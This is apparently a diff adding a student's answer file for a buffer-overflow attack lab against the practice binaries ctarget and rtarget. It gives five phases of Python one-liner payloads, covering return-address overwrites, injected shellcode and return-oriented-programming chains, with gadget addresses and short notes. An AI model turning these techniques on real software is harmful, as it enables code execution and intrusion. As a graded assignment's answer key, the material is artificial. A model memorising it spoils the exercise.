@@ -1,0 +1,46 @@
+(Phase 1)
+python -c "print('A'*40 + '\x54\x17\x40\x00\x00\x00\x00\x00')" | ./ctarget
+Overflow the 40 byte buffer and overflow the return address.
+
+(Phase 2)
+python -c "print('\x48\xc7\xc7\x85\x21\xd5\x36\xc3' + 'A'*32 + '\x98\xf7\x66\x55' + '\x00'*4 + '\x80\x17\x40' + '\x00'*5)" | ./ctarget
+First string is the exploit, executes "mov $0x36d52185,%rdi" followed by ret (c3). 'A' fills the buffer.
+'\x98\xf7\x66\x55' is the address of the %rsp before getbuf() ends. The 0x401780 is the address of touch2(). It is called
+after the exploit string ends.
+
+(Phase 3)
+python -c "print('36d52185' + '\x00' + '\x48\xc7\xc7\x92\xf7\x66\x55\xc3' + 'A'*23 + '\xa1\xf7\x66\x55\x00\x00\x00\x00' + '\x54\x18\x40\x00\x00\x00\x00\x00')" | ./ctarget
+Cookie string at beginning of buffer. Exploit string and A fills the buffer. '\xa1\xf7\x66\x55\x00\x00\x00\x00' is start
+of exploit string. Exploit string loads address of getbuf() rsp into %rdi offset by 6 for some reason. Final portion is
+address of touch3.
+
+(Phase 4)
+python -c "print('A'*40 + '\xff\x18\x40\x00\x00\x00\x00\x00' + '\x85\x21\xd5\x36\x00\x00\x00\x00' + '\xf3\x18\x40\x00\x00\x00\x00\x00' + '\x80\x17\x40\x00\x00\x00\x00\x00')" | ./rtarget
+
+pop rax: 0x4018ff
+cookie: 0x36d52185
+mov rax rdi: 0x4018f3
+touch2: 401780
+
+(Phase 5)
+python -c "print('A'*40 + '\xff\x18\x40\x00\x00\x00\x00\x00' + '\x20\x00\x00\x00\x00\x00\x00\x00' + '\x8a\x19\x40\x00\x00\x00\x00\x00' + '\x2b\x19\x40\x00\x00\x00\x00\x00' + '\xc1\x19\x40\x00\x00\x00\x00\x00' + '\x91\x19\x40\x00\x00\x00\x00\x00' + '\xf3\x18\x40\x00\x00\x00\x00\x00' + '\x1d\x19\x40\x00\x00\x00\x00\x00' + '\xf3\x18\x40\x00\x00\x00\x00\x00' + '\x54\x18\x40\x00\x00\x00\x00\x00' + '36d52185' + '\x00')"
+
+Basically does this:
+pop rax (40 - 8)
+mov eax ecx
+mov ecx edx
+mov edx esi
+mov rsp rax
+mov rax rdi
+rdi + rsi -> rax
+mov rax rdi
+return touch3 0x401854
+"36d52185\x00"
+
+mov rsp rax: 0x401991
+mov rax rdi: 0x4018f3
+pop rax: 0x4018ff
+rdi + rsi -> rax: 0x40191d
+mov edx esi: 0x4019c1
+mov eax ecx: 0x40198a
+mov ecx edx: 0x40192b
